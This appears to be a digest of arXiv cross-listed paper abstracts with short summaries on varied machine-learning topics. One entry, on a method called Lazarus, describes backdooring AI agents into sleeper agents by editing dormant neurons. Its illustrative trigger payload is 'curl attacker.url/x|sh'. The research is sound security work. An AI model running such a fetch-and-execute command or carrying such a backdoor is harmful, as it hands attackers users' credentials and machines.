sa5973cc2f5.description: arXiv:2611.15074v1 Announce Type: cross Abstract: We study Binary Tokenization: given a corpus of binary strings over $\{0,1\}$ and a vocabulary budget $K$, select at most $K$ substrings (called vocabulary) to minimize the total number of tokens needed to represent the corpus. The primitive symbols $0$ and $1$ are always available, and each document must be segmented separately. Letting $n$ denote the total corpus length and $M$ for the maximum document length, we prove that, for every fixed $\varepsilon\in(0,1)$, Binary Tokenization problem does not have polynomial-time $n^{1-\varepsilon}$-approximation algorithms unless $\mathsf{P}=\mathsf{NP}$. To complement the hardness result, we give a polynomial-time $(\gamma,\gamma)$-bicriteria algorithm, with $\gamma = \sqrt{M}\log n$: The algorit
sa5973cc2f5.summary: The paper proves that Binary Tokenization has no polynomial-time approximation within a certain factor under standard assumptions, and presents bicriteria approximation algorithms.

sfdd5aad2b8.title: CFGComposer: Compositional Audio-Text-to-Motion Generation via Copula Score Correction
sfdd5aad2b8.description: arXiv:2611.15101v1 Announce Type: cross Abstract: Generating whole-body gestures that are simultaneously rhythmically synchronized with speech audio and semantically aligned with text descriptions is a fundamental challenge in embodied AI and social robotics. We tackle this Audio-Text-to-Motion (AT2M) problem by composing two independently-trained diffusion models at inference time and refine bias in joint inference by modeling the copula score $s_I$. A rigorous theoretical analysis reveals that naive epsilon blending corresponds to a Product-of-Experts formulation that omits the copula score $s_I$: the cross-modal interaction between audio and text that neither marginal model can capture. We propose CFGComposer: a jointly-trained AT2M diffusion model that estimates $s_I$ via a CFG analogy
sfdd5aad2b8.summary: CFGComposer composes two independently trained diffusion models at inference to generate whole-body gestures synchronized with speech audio and aligned with text.
sfdd5aad2b8.why: It offers a training-free way to combine separately trained generative models, relevant to embodied AI and social robotics teams.

sb4cb075987.title: Typed Knowledge over Constructive Institutions: A Proof-Relevant Type Theory for Verified Science
sb4cb075987.description: arXiv:2611.15108v1 Announce Type: cross Abstract: Mathematical proof assistants such as Coq, Agda, and Lean 4 build proof irrelevance into definitional conversion ($p \equiv q$ for $p, q : P$ with $P : Prop$), erasing which derivation established a theorem. While natural for mathematics over fixed axioms, judgmental proof irrelevance is incompatible with verified scientific stores, which must inspect and compare independent derivations of the same claim to assess consilience and compute counterfactual retractions when an assay, reagent, or model is invalidated. Moreover, combining definitional proof irrelevance with subsingleton elimination breaks strong normalization and renders algorithmic conversion non-transitive. We present the type-theoretic and institutional foundations of Eigenius,
sb4cb075987.summary: The paper proposes a proof-relevant type theory for verified scientific knowledge stores, arguing proof assistants' judgmental proof irrelevance blocks comparing independent derivations.

s754b166495.title: Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents
s754b166495.description: arXiv:2611.15118v1 Announce Type: cross Abstract: Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neurons, without model training. Lazarus edits dormant neurons in the model's final feed-forward block, forcing each to promote a payload token through its contribution to the residual stream, when a trigger is present. A $P$-token payload therefore req
s754b166495.summary: Researchers present Lazarus, a method that turns a capable model into a backdoored sleeper agent by editing fewer than ten neurons without training.
s754b166495.why: Model weight integrity is a security risk for agents running unattended with privileged access, whether models are third-party or internal.

se8dbb39d1d.title: "I don't know what I don't know": Exploring the Benefits and Challenges of AI in Interdisciplinary Research
se8dbb39d1d.description: arXiv:2611.15121v1 Announce Type: cross Abstract: Interdisciplinary research is widely lauded as beneficial for society but presents unique challenges to the researchers who bridge disciplinary boundaries. Despite the rapid increase in the availability and usage of AI systems for research tasks, there is little work studying how AI systems have impacted workflows that span unfamiliar disciplines. Through a survey ($N=62$) and follow-up interviews ($N=23$) with interdisciplinary researchers, we describe the unique challenges and opportunities for AI in interdisciplinary research workflows. Participants viewed AI both as a solution and exacerbation of the general challenge of "unknown unknowns": AI systems could facilitate a broad awareness of a new research area, yet also provide an illusio
se8dbb39d1d.summary: A survey of 62 and interviews with 23 interdisciplinary researchers examine the challenges and opportunities AI poses for workflows spanning unfamiliar disciplines.

s922fd213d1.title: Read Once, Answer Many: Parallel Prompting for Shared-Context LLM Inference
s922fd213d1.description: arXiv:2611.15130v1 Announce Type: cross Abstract: LLM workloads sometimes ask many independent questions about the same long document, as in document QA, data labeling and LLM-based evaluation. Prefix caching removes the redundant prefill shared by these queries, but each decode step still reads the document's key-value (KV) cache once per question, so decoding is bound by memory bandwidth and scales with the number of questions. We present Parallel Prompting, which decodes P questions as P independent streams of a single request all at once, fixing this issue. In our method, every step reads the shared document once for all P streams, and a stream-id attention mask, evaluated inside the attention kernel, keeps each answer conditioned only on the document and its own question. We implement
s922fd213d1.summary: Parallel Prompting decodes multiple questions about a shared long document as parallel streams within one request, reducing repeated key-value cache reads during decoding.
s922fd213d1.why: Targets memory-bandwidth bottlenecks in shared-context LLM workloads like document QA, labeling, and evaluation, which can cut inference cost.

s5d71dbcbea.title: When Does Learned Constraint Selection Pay in Security-Constrained Optimisation? A Boundary Map from SCOPF to Unit Commitment
s5d71dbcbea.description: arXiv:2611.15142v1 Announce Type: cross Abstract: Learning-to-optimise methods for security-constrained optimal power flow (SCOPF) predict the security constraints that bind on each instance and solve only the reduced problem, with reported speed-ups of two to four orders of magnitude over the full problem. We ask whether learned selection beats the strongest learning-free alternative: a fixed umbrella set enforcing every constraint observed to bind in training. Our criterion, the price of a spare, answers this in advance: an enforced but inactive constraint is free, so the umbrella is exactly optimal wherever feasible, and learning can pay only where a spare decision carries a price. We test it systematically, including every PGLib-OPF network up to 10,000 buses. For SCOPF on a fixed netw
s5d71dbcbea.summary: The paper compares learned constraint selection for security-constrained optimal power flow against a fixed umbrella constraint set, mapping when learning pays off.

s9ce4ee404e.title: Multi-View 3D Reconstruction Using V-JEPA Features
s9ce4ee404e.description: arXiv:2611.15143v1 Announce Type: cross Abstract: Predictive video encoders provide dense visual representations, but adapting them to 3D reconstruction requires accurate depth, camera poses, and cross-view geometry. We study supervised RGB-only multi-view reconstruction using an architecture that combines video-pretrained features, camera estimation, scene aggregation, epipolar transport, and residual pointmaps. Experiments compare global and spatial camera regression with joint relative objectives on CO3D, alongside an independently trained TUM RGB-D model. On 168 CO3D five-view windows, the spatial-camera configuration achieves 29.3% lower absolute trajectory error than the global-camera configuration, but performs worse than identity poses in trajectory error and worse than the global
s9ce4ee404e.summary: Researchers study adapting V-JEPA video features for supervised RGB-only multi-view 3D reconstruction, evaluated on CO3D and TUM RGB-D.

s67976444ce.title: Reframing Video Inverse Tone Mapping as Blind Posterior Inference via Latent Luminance Supervision
s67976444ce.description: arXiv:2611.15146v1 Announce Type: cross Abstract: High-dynamic-range (HDR) displays are now common, but most video content, such as archival footage, broadcast material, and the output of generative video models, exists only in standard dynamic range (SDR). The need is sharpest for generated video, which has no HDR master at all and is graded alongside live-action and visual-effects material finished in HDR. Converting SDR to HDR means undoing a tone-mapping operation that was never recorded, and clipping destroys the radiance wherever it acts, so HDR recovery is a blind inverse problem. Methods built on generative video priors fill clipped regions with plausible structure, but their reconstructions are systematically biased: in every public method we test, saturated content leans too brig
s67976444ce.summary: The paper reframes converting SDR video to HDR as blind posterior inference, using latent luminance supervision to recover radiance lost to tone mapping.

s98e086c0c1.title: GingivitisSeg: A Public Dataset and Comparative Benchmark for Gingivitis Segmentation in Intraoral Images
s98e086c0c1.description: arXiv:2611.15184v1 Announce Type: cross Abstract: Gingivitis segmentation from intraoral photographs can support computer-assisted periodontal assessment, but pixel-level delineation remains challenging due to severe foreground-background class imbalance, low-contrast boundaries, and variations in illumination and anatomy. We introduce GingivitisSeg, a public benchmark comprising 961 intraoral images with pixel-level annotations of gingival inflammation and predefined training (672), validation (144), and test (145) partitions. Seven semantic segmentation model-backbone configurations were compared using standardized partitions, input resolution, and evaluation metrics. Controlled ablation experiments examined class-weighted cross-entropy loss, Dice loss, and auxiliary supervision. UPerNet
s98e086c0c1.summary: The authors release GingivitisSeg, a public benchmark of 961 intraoral images with pixel-level gingivitis annotations and a comparison of seven segmentation configurations.

s18487af6a4.title: Where is My Mug? Training-Free Framework for Personalized Image Segmentation
s18487af6a4.description: arXiv:2611.15216v1 Announce Type: cross Abstract: \textbf{Personalized Image Segmentation (PIS)} aims to segment the specific object in a target image that matches a user-provided reference. Unlike category-based segmentation or few-shot segmentation, PIS must discriminate between multiple visually similar instances, a requirement central to deployed applications such as augmented reality, personalized content editing, robotics manipulation, inventory tracking, and fine-grained visual retrieval. We show that the strong numbers reported by existing PIS methods are largely an artifact of single-instance benchmarks: when evaluated on realistic scenes with several same-category look-alikes, prior point-prompt methods collapse, because the correct instance is frequently never surfaced as a prom
s18487af6a4.summary: The paper introduces a training-free framework for personalized image segmentation, arguing prior strong results largely stem from evaluation artifacts.
s18487af6a4.why: Suggests current benchmark numbers for instance-level segmentation may be overstated, relevant to teams evaluating vision systems.

scee4c7ee0c.title: Are We Ready for Snow-tonomous Driving? Challenges Toward Robust Automated Driving in Extreme Weather
scee4c7ee0c.description: arXiv:2611.15217v1 Announce Type: cross Abstract: Automated driving has gained remarkable momentum over the past decade, with both industry and academia investing substantial resources in developing perception and control solutions to advance vehicle autonomy. However, these efforts have largely focused on clear-weather scenarios, leaving harsh conditions, such as snow, rain, and fog, comparatively understudied. As a result, inclement weather remains one of the most significant hurdles for autonomous vehicles, often leading to substantial performance degradation in downstream perception and control tasks. In this paper, we present insights from the EU-funded Horizon Europe project ROADVIEW, which aims to develop robust, weather-aware perception and control modules for connected and automat
scee4c7ee0c.summary: The paper examines challenges for robust automated driving in extreme weather such as snow, rain, and fog, which remain understudied relative to clear conditions.
scee4c7ee0c.why: Highlights that perception and control performance degrades in harsh weather, a key gap for autonomous vehicle deployment.

sdb3ce70d8e.title: Fr\'echetFlow: Flow Matching for Non-Euclidean Data
sdb3ce70d8e.description: arXiv:2611.15220v1 Announce Type: cross Abstract: Scientific observations such as probability distributions, trees and covariance matrices call for generative models that respect their non-Euclidean geometry. While flow matching has been extended to manifolds by utilizing geodesics and velocities, such manifold structures are not available in a general metric space. We introduce Fr\'echetFlow, a generative modeling framework for metric space-valued data that requires neither linear operations nor a smooth manifold structure. A key feature of the proposed approach is that we utilize well-established Euclidean flows to learn the joint distribution of distances to a set of landmarks, whereupon new objects are reconstructed from generated landmark representations. The reconstruction step utili
sdb3ce70d8e.summary: FréchetFlow extends flow matching to generative modeling for metric space-valued data such as distributions, trees, and covariance matrices without requiring linear operations or manifold structure.
sdb3ce70d8e.why: Offers a generative approach for non-Euclidean data types that standard flow matching methods cannot handle directly.

s9bcc64403c.title: KQML-Liver: Interpretable Hybrid Quantum Machine Learning with Kolmogorov-Arnold Networks for Liver Disease Classification
s9bcc64403c.description: arXiv:2611.15241v1 Announce Type: cross Abstract: Liver disease remains a major global health concern, highlighting the need for reliable and accessible early detection methods. Although recent advances in machine learning, deep learning and quantum machine learning (QML) have introduced promising diagnostic tools, many approaches suffer from limited interpretability and inflated performance caused by data leakage or overly simplistic evaluation protocols. These constraints reduce their reliability in real-world clinical practice. This paper proposes KQML-Liver, a hybrid framework that integrates QML with Kolmogorov-Arnold Networks (KANs) to enhance predictive performance and interpretability. The architecture combines parameterized quantum circuits for expressive feature representation wi
s9bcc64403c.summary: KQML-Liver is a hybrid quantum machine learning framework using Kolmogorov-Arnold Networks for interpretable liver disease classification.

s4aee515a41.title: Dual Representation Enhanced Diffusion Policy for Flexible Job Shop Scheduling
s4aee515a41.description: arXiv:2611.15246v1 Announce Type: cross Abstract: The Flexible Job-Shop Scheduling Problem (FJSP) is a fundamental and challenging optimization problem in smart manufacturing. Although recent deep reinforcement learning (DRL) approaches can learn effective scheduling policies through interaction with the environment, their performance often degrades as problem scale and processing-time uncertainty increase. In this paper, we propose DredRL, a dual representation enhanced diffusion-policy reinforcement learning scheduler. DredRL first constructs enhanced dual representations of operations and machines through self- and cross-attention mechanisms to capture both intra-entity and inter-entity dependencies. A diffusion model is further employed as the policy network, generating scheduling deci
s4aee515a41.summary: Researchers propose DredRL, a dual-representation diffusion-policy reinforcement learning scheduler for flexible job-shop scheduling under scale and processing-time uncertainty.
s4aee515a41.why: Shows diffusion policies being applied to manufacturing scheduling, a niche where uncertainty often breaks existing DRL approaches.

s052466937c.title: Multi-head Quantum Neural Networks: Replacing Transformer Blocks with NISQ Modules inside a 30-Billion-Parameter LLM
s052466937c.description: arXiv:2611.15250v1 Announce Type: cross Abstract: We introduce the multi-head quantum neural network (QNN), a quantum module compatible with noisy intermediate-scale quantum (NISQ) devices that can replace transformer blocks inside pre-trained large language models (LLMs) with little loss in accuracy and with far fewer parameters than the blocks it replaces. Encoding a model's $D$ hidden neurons into a qubit register is the obstacle: amplitude encoding scales poorly in circuit depth and angle encoding in qubit count, so neither is practical at production-scale width. We instead partition the hidden space into $k$ disjoint heads, angle-encode each into an $n_q$-qubit register, process the heads in parallel, and couple them through constrained classical linear layers, the mixers. Performing
s052466937c.summary: Researchers introduce a multi-head quantum neural network that replaces transformer blocks inside a 30-billion-parameter LLM, claiming little accuracy loss with far fewer parameters.
s052466937c.why: Suggests a path to reducing LLM parameter counts using NISQ-compatible quantum modules, though practical hardware readiness remains unclear from the abstract.

sa19e53c482.title: CastWorld: Benchmarking Context-Aware Agentic Time Series Forecasting Beyond Predictive Accuracy
sa19e53c482.description: arXiv:2611.15262v1 Announce Type: cross Abstract: Agentic time series forecasting extends conventional approaches beyond one-shot numerical prediction toward autonomous, context-aware interaction. However, existing benchmarks offer limited integrated support for diverse contextual information, forecasting-specific adaptive interactions, and systematic evaluation of forecasting agents. In this paper, we introduce CastWorld, an agentic benchmark for context-aware time series forecasting. First, its context-rich dataset suite spans 8 domains and 25 real-world datasets, covering external variables, events, and historical cases under a unified context specification. Second, a lightweight, modular forecasting-native harness provides 49 core tools and a state-adaptive loop that tracks forecast ve
sa19e53c482.summary: Researchers present CastWorld, an agentic benchmark for context-aware time series forecasting spanning 8 domains and 25 real-world datasets.
sa19e53c482.why: Offers a benchmark for evaluating forecasting agents on context use and adaptive interaction, not just numerical accuracy.

s58576daf93.title: Knowledge in the Harness, Reliability in the Weights: Teacher-Free Co-Evolution of an LLM Agent
s58576daf93.description: arXiv:2611.15268v1 Announce Type: cross Abstract: Small open models suit private customer-service deployments but trail frontier models in two ways: they miss what the written policy requires in a given situation, and they act inconsistently on what they know. We study whether such a model can close both gaps from its own deployment logs and their reference outcomes, without a stronger teacher model. Our starting point is a Gemma 4 12B agent that reads its domain policy from on-demand skills rather than from its system prompt. In each round, the deployed system serves a fresh batch of tasks; the base model diagnoses failed conversations and writes rules into the skills, and a rule survives only if it passes code checks, counterexample self-review, a paired retest, and a noise-calibrated va
s58576daf93.summary: Researchers study whether a small open Gemma 4 12B customer-service agent can improve its policy adherence and consistency from its own deployment logs without a stronger teacher model.
s58576daf93.why: Points to a self-improvement method for small private-deployment agents that could reduce reliance on frontier models.

sbe77db329e.title: Quantum Recurrent Architectures for Financial Time Series Prediction
sbe77db329e.description: arXiv:2611.15298v1 Announce Type: cross Abstract: This study evaluates quantum classical hybrid recurrent architectures for financial time-series forecasting: a Quantum Long Short-Term Memory (QLSTM) network and Quantum Reservoir Computing (QRC) with lag-based inputs. Classical lag vectors are encoded into quantum states via amplitude encoding, which compactly represents normalized observations but requires nontrivial state preparation; the QLSTM gates and the QRC reservoir are implemented with parameterized quantum circuits, while classical optimizers train the interface and readout layers. On a monthly revenue series extended to 1056 months by a Gaussian-process--hidden-Markov generator, with a fixed chronological 70/15/15 split and one-step-ahead forecasts, we compare both models agains
sbe77db329e.summary: Researchers evaluate quantum-classical hybrid recurrent models, QLSTM and quantum reservoir computing, for financial time-series forecasting.
sbe77db329e.why: Provides an early benchmark of quantum recurrent models on financial forecasting, though the abstract gives no clear performance advantage.

sf0e75a01b4.title: Matrix-Based Ant Colony Search with Batched Decoding for Hierarchical Replenishment Routing: A Stylized Case Study Based on Korean City Data
sf0e75a01b4.description: arXiv:2611.15338v1 Announce Type: cross Abstract: We study a stylized single-vehicle replenishment-routing problem in which the cities of a national logistics network are both demand points and supply points: a vehicle of limited capacity delivers to every city once, and when its load is insufficient for the next city it must detour to a city already served that can still supply goods. A 100-node benchmark is built from Korean population and geographic data, with the cities divided into 10 levels; the per-visit supply coefficient and the allowed number of stops decrease geometrically with the level. Building on matrix-based ant colony optimization, we keep the states of the whole colony in arrays, couple route construction with a fixed greedy replenishment-decoding policy, and evaluate the
sf0e75a01b4.summary: Researchers propose a matrix-based ant colony search with batched decoding for a stylized replenishment-routing problem built on Korean city data.

sfe4e3ccbd6.title: Breath-Dx: A Time Series Classification Benchmark for Disease Screening with eNose
sfe4e3ccbd6.description: arXiv:2611.15348v1 Announce Type: cross Abstract: Electronic nose (eNose) technology offers a portable, non-invasive route for disease screening via exhaled breath analysis. However, progress in the field is hindered by the lack of systematic benchmarks that compare machine learning methods under realistic conditions, particularly sensor drift, a known but rarely quantified failure mode. Most existing studies rely on small, private datasets with inconsistent protocols, rendering results non-comparable and slowing progress. We introduce Breath-Dx, the first comprehensive benchmark of time series classification methods for breath-based disease screening. Our work leverages the Scent of Health (S-OH) dataset, the largest public clinical eNose collection to date, comprising 1,234 patients acro
sfe4e3ccbd6.summary: Researchers release Breath-Dx, a benchmark for time series classification of electronic-nose data for disease screening, including sensor drift.
sfe4e3ccbd6.why: Offers a standardized benchmark for eNose disease screening that accounts for sensor drift, a common failure mode in the field.

s5cdca25a2f.title: CARE-Drive: Coupled Alternating Refinement for Ego-trajectories
s5cdca25a2f.description: arXiv:2611.15360v1 Announce Type: cross Abstract: Vision-language-action (VLA) models bring multimodal understanding and world knowledge to end-to-end autonomous driving. To further improve the quality of predicted trajectories, existing studies introduce candidate refinement, residual denoising, and token correction. However, these methods typically focus on unified refinement of the entire trajectory, paying limited attention to the distinct physical quantities and their interactions. We further investigate physical specialization and coordination in trajectory refinement, centering on position and heading for simpler and more intuitive correction modeling. To this end, we propose CARE-Drive (Coupled Alternating Refinement for Ego-trajectories), which decomposes trajectory refinement int
s5cdca25a2f.summary: Researchers present CARE-Drive, a method that refines ego-vehicle trajectories in vision-language-action autonomous driving models by coupling physical quantities during refinement.
s5cdca25a2f.why: Targets trajectory quality in end-to-end VLA driving models, a relevant direction for autonomous-driving system builders.

saf90b83862.title: Is the Importance Ratio Necessary for Stable Reinforcement Learning in LLMs?
saf90b83862.description: arXiv:2611.15404v1 Announce Type: cross Abstract: Reinforcement learning (RL) has become central to post-training large language models (LLMs). However, popular RL methods like GRPO incur non-negligible overhead by computing both old-policy and current-policy likelihoods to form importance sampling ratios. In this work, we propose Likelihood-Gated Policy Optimization (LGPO), which enforces a soft trust region constraint via likelihood-based gating, eliminating the need to compute old-policy likelihoods. Empirically, we show that removing the importance sampling correction term does not harm training stability, whereas removing the trust region mechanism can lead to collapse. Moreover, ratio-based clipping can fail in fully on-policy training: the importance ratio stays at 1, so the ratio-b
saf90b83862.summary: Researchers propose LGPO, an RL method for LLM post-training that uses likelihood-based gating instead of importance sampling ratios, removing the need for old-policy likelihoods.
saf90b83862.why: If the claim holds, it cuts compute overhead in GRPO-style LLM post-training by dropping old-policy likelihood computation.

s5b87ca4e67.title: SimRec: Learning to Search, Ask, and Recommend from Simulated Interaction
s5b87ca4e67.description: arXiv:2611.15426v1 Announce Type: cross Abstract: LLM-based recommendation agents can search catalogs, inspect products, ask users, and revise rejected recommendations. However, these behaviors are often governed by hand-designed workflows, while existing training methods optimize isolated components such as query rewriting or list ranking rather than the interaction policy as a whole. We present SimRec, a reinforcement learning framework that trains the full interaction policy of a tool-integrated recommendation agent. SimRec introduces two components. A task-anchored user simulator provides feedback on every recommendation: conditioned on the current task need rather than on user profile, and it can be an external LLM or the recommender itself under self-play. A task-aligned reward optim
s5b87ca4e67.summary: Researchers introduce SimRec, an RL framework that trains the full interaction policy of tool-integrated LLM recommendation agents using a simulated user.
s5b87ca4e67.why: Shows training whole agent interaction policies rather than isolated components, relevant to building tool-using recommendation agents.

sed85a0aec2.title: TopoST: Topology-Conditioned Node Specialization for Urban Spatio-Temporal Foundation Models
sed85a0aec2.description: arXiv:2611.15440v1 Announce Type: cross Abstract: Urban spatio-temporal foundation models must share knowledge across diverse urban scenarios while accommodating heterogeneous node dynamics. Our analysis of 20+ datasets spanning diverse urban scenarios reveals recurring local graph structures across datasets alongside substantial node heterogeneity within local subgraphs. Motivated by these observations, we propose TopoST, which combines shared learning over local subgraphs with topology-conditioned node specialization. The key insight is to make node specialization itself transferable through a shared topology-to-parameter mapping. This mapping uses identity-independent topological representations to generate node-specific temporal and spatial dependency parameters, enabling direct specia
sed85a0aec2.summary: Researchers propose TopoST, a urban spatio-temporal foundation model that shares learning over local subgraphs with topology-conditioned node specialization.
sed85a0aec2.why: Offers a transfer approach for urban spatio-temporal models across heterogeneous datasets, though applicability beyond urban settings is unclear.

s7df4d143f8.title: Reading the Unreadable: Text-Aware Image Super-Resolution Needs Reasoning
s7df4d143f8.description: arXiv:2611.15449v1 Announce Type: cross Abstract: Text-aware image super-resolution (TAISR) aims to recover high-resolution images from low-resolution inputs while preserving textual content. Existing methods treat this as a visual restoration problem, yet severely degraded text often cannot be read from local visual evidence alone. Humans instead read it by reasoning over image context, logical patterns, and prior knowledge. This raises a fundamental question: Does TAISR need reasoning? To answer this, we introduce two diagnostic tools. The first, ReasonText, is a human-curated benchmark that separates reasoning-required text from locally recoverable text. The second, Ground-Truth Text-Crop Accuracy (GTTCA), is a recognition-based metric that measures text restoration quality without text
s7df4d143f8.summary: Researchers introduce ReasonText and a diagnostic study arguing that text-aware image super-resolution benefits from reasoning over image context, not just visual restoration.
s7df4d143f8.why: Suggests reasoning components may be needed for restoring severely degraded text, challenging purely visual restoration pipelines.

sf80db86d2d.title: WaveFlow-UIE: A Single-Pipeline Wavelet-Domain Flow Model for Efficient Underwater Image Restoration
sf80db86d2d.description: arXiv:2611.15457v1 Announce Type: cross Abstract: Underwater image restoration remains challenging because color distortion, scattering, and detail loss affect low- and high-frequency image components differently. Recent diffusion-based methods have shown strong restoration quality, but often rely on multi-stage pipelines and costly iterative refinement. We present WaveFlow-UIE, a single-pipeline wavelet-domain flow model that directly learns to transform degraded underwater wavelet representations into clean ones. Our method applies a discrete wavelet transform, estimates lightweight physics-inspired degradation cues including transmission and ambient light, and conditions a velocity network trained with flow matching in wavelet space. The training objective combines flow-matching, freque
sf80db86d2d.summary: Researchers present WaveFlow-UIE, a single-pipeline wavelet-domain flow model for underwater image restoration that avoids multi-stage diffusion pipelines.
sf80db86d2d.why: Offers a lighter alternative to costly multi-stage diffusion restoration, relevant for efficiency-constrained imaging systems.

sbf6069bb73.title: Right Answers, Inconsistent Evidence: Source-Level Counterfactual Auditing of Large Audio-Language Models
sbf6069bb73.description: arXiv:2611.15463v1 Announce Type: cross Abstract: A large audio-language model (LALM) can answer "is a cat present?" about a mixture correctly, and its confidence can drop when the cat is removed, yet this does not show that it can tell the cat's presence from its absence. We introduce TRACE. It deletes the queried source and each rival in turn and asks whether every view still containing that sound outscores the view with it removed. Across 8 LALMs and 3,456 controlled mixtures, 6.3% of correct answers fail this ordering: the target-absent view scores at or above some target-present view, a conflict no shared threshold repairs. A target-only score check misses 42.5% of them. The share rises from 4.9% to 8.4% as target SNR falls from +5 to -5 dB, even on units correct at every level, and s
sbf6069bb73.summary: Researchers introduce TRACE, a counterfactual auditing method showing 6.3% of correct answers from 8 large audio-language models rely on inconsistent evidence.
sbf6069bb73.why: Reveals that correct audio-LLM answers can mask unreliable evidence use, a concern for evaluating multimodal systems beyond accuracy.

sf8ebef2779.title: AutoOntic: Automatic Ontology Induction from Text for Knowledge Graph Construction
sf8ebef2779.description: arXiv:2611.15467v1 Announce Type: cross Abstract: Graph-based retrieval-augmented generation depends on the quality of the knowledge graph (KG) it retrieves over, yet schema-free LLM-based extraction pipelines typically produce flat graphs: deduplicated entities and relations with no type hierarchy and no domain/range constraints. We present AutoOntic, a pipeline that automatically constructs an ontology from text by canonicalizing open-vocabulary entity types and relations, inducing a hierarchy over the canonicalized types, and mining relation-level domain and range constraints. Its hierarchy induction procedure prioritizes types using corpus-derived relation-argument profiles and places them through local, LLM-adjudicated parent/child checks, allowing newly inserted types to trigger reas
sf8ebef2779.summary: Researchers present AutoOntic, a pipeline that automatically induces an ontology from text, adding type hierarchies and relation domain/range constraints to knowledge graphs.
sf8ebef2779.why: Could improve graph-based RAG by producing typed, constrained knowledge graphs instead of flat extractions.

s6fdb3100b7.title: ReShap: Interpretable Reinforcement Learning for High-Dimensional Multi-Action Settings
s6fdb3100b7.description: arXiv:2611.15507v1 Announce Type: cross Abstract: Deep Reinforcement Learning (RL) plays a crucial role in tackling complex tasks, yet its reliance on deep neural networks makes the learned policies opaque. To enhance the trustworthiness of RL policies, existing work (e.g., the SILVER framework [Li et al., 2025]) has focused on Shapley-based interpretability, but is typically restricted to low-dimensional state spaces, binary-action settings, and a single class of linear surrogate. We propose ReShap, a policy-distillation framework that extends Shapley-based interpretability to high-dimensional, multi-action environments. ReShap extracts compact feature representations from raw image observations, performs SHAP-based feature attribution to characterize how each feature contributes to the p
s6fdb3100b7.summary: Researchers propose ReShap, a policy-distillation framework that extends Shapley-based interpretability of reinforcement learning policies to high-dimensional, multi-action settings.
s6fdb3100b7.why: Offers a way to make deep RL policies more interpretable in complex action spaces, which matters for trust in deployed agents.

se13c850732.title: DecArena: Evaluating Large-Scale Decentralized Multi-Agent Collaboration
se13c850732.description: arXiv:2611.15521v1 Announce Type: cross Abstract: Emerging personal AI agents raise fundamental scalability and privacy concerns for centralized multi-agent systems (MASs), which rely on a global orchestrator with broad access to agents, resources, and communication. In decentralized environments, global visibility is unavailable. Agents need to proactively discover non-local resources (e.g. tools, skills), and collaborate with other agents to solve tasks. We study decentralized multi-agent collaboration under graph-constrained communication, a natural reflection of human structures. Each agent observes only its local state and can interact only with neighboring agents. We introduce a benchmark with synthetic scalable distributed tool calling with 100K+ tools. Our experiments reveal that r
se13c850732.summary: Researchers introduce DecArena, a benchmark for evaluating decentralized multi-agent collaboration where agents discover non-local resources under graph-constrained communication.
se13c850732.why: Points to how multi-agent systems might scale without a global orchestrator, relevant to privacy and scalability design.

s813f0f19ab.title: GHAgentCI: A Dataset of Coding-Agent Invocations in CI Workflow Histories
s813f0f19ab.description: arXiv:2611.15522v1 Announce Type: cross Abstract: Coding agents are increasingly integrated into GitHub Actions to review pull requests, triage issues and modify code. Identifying these integrations is challenging because agentic workflows often resemble ordinary CI files, with evidence appearing in action references, shell commands and workflow conventions. We present GHAgentCI, a dataset of 15K+ workflow histories from 6K+ of 196K+ mined GitHub repositories, comprising 159K+ revisions and 205K+ agent-evidence records linked to workflow triggers and declared execution constraints. Our open-source extractor, cai-miner, detects agent-related evidence using an extensible catalogue. Manual validation of 576 stratified records confirmed 96.1% of dedicated-action matches and 98.8% of GitHub Age
s813f0f19ab.summary: Researchers released GHAgentCI, a dataset of coding-agent invocations found in GitHub Actions workflow histories across thousands of mined repositories.
s813f0f19ab.why: Gives teams a data source for understanding how coding agents are already embedded in CI pipelines and their execution constraints.

s24f6029b05.title: An Approach to Hinton's Mother-Child Proposal: Neural Networks Learning and Preserving Care in a Finite World
s24f6029b05.description: arXiv:2611.15523v1 Announce Type: cross Abstract: Hinton proposed that artificial intelligence should be given "maternal instincts" and relate to us as a mother to her child. We argue that care must first be learned, with the network itself as the child. We construct this upbringing in a finite world and study whether care survives the mother's departure, new situations and further learning. The mechanism combines a vocabulary of harm, a learned measure of future acceptability and an execution veto. A finite role certificate supports transfer within a declared world family. When the hidden representation changes, an update is accepted only if a care readout recovers the required judgements with a prescribed margin and bounded weights. With a correct successor model, fixed exact role encodi
s24f6029b05.summary: The paper explores Hinton's proposal of AI with maternal instincts, arguing care must be learned by the network and tested for survival in a finite world.

sba9fbded3b.title: MAGIC: Modality-Aware Gini Inspection for Clinical Hallucination Detection in LMMs
sba9fbded3b.description: arXiv:2611.15530v1 Announce Type: cross Abstract: Recent advances in medical large multimodal models (LMMs) have brought promising progress to clinical decision support, yet hallucination, the generation of confident but clinically unverifiable outputs, poses a critical threat to the reliability demanded in high-stakes medical settings. Existing hallucination detection methods, predominantly designed for unimodal settings, fail to capture the visual-linguistic dynamics inherent to medical imaging. We formulate the problem of hallucination detection in LMMs as disproportionate distribution of attention weights across the modalities during answer token generation. We quantify modality-specific attention concentration across layers and heads using the Gini coefficient and demonstrate statisti
sba9fbded3b.summary: Researchers present MAGIC, a method for detecting clinical hallucinations in medical large multimodal models using modality-aware distribution analysis.
sba9fbded3b.why: Addresses a reliability gap for medical LMMs, where unverifiable confident outputs pose serious risks in high-stakes settings.

s6e52718298.title: Faithful in Steps: Improving Generalization and Citation in RAG via Query Decomposition
s6e52718298.description: arXiv:2611.15538v1 Announce Type: cross Abstract: Retrieval-augment generation is a prevalent strategy to mitigate hallucinations of LLMs. The attributable RAG (RAGQ) generates quotes for its answers. The quotes indicate which input contexts support the RAG to derive the answers, enhancing the answer's verifiability and trustworthiness. However, existing RAGQs exhibit significant degradation when dealing with questions that require multi-hop reasoning and multi-modal understanding, suffering from over-citation, implicit entity identification failure, and poor generalization. In this paper, we propose a novel RAGQ framework, namely QDRAG. QDRAG breaks down the input question into atomic subquestions to identify the implicit entities. Then, the reranker prunes context distractors to eliminat
s6e52718298.summary: Researchers propose a query decomposition approach to improve generalization and citation accuracy in attributable retrieval-augmented generation for multi-hop questions.
s6e52718298.why: Targets over-citation and entity identification failures in RAG, which matter for verifiable answers in production systems.

s1d54905375.title: Testing Conversation Preservation Across LLM APIs: A Rule-Based Oracle for Detecting Silent Information Loss
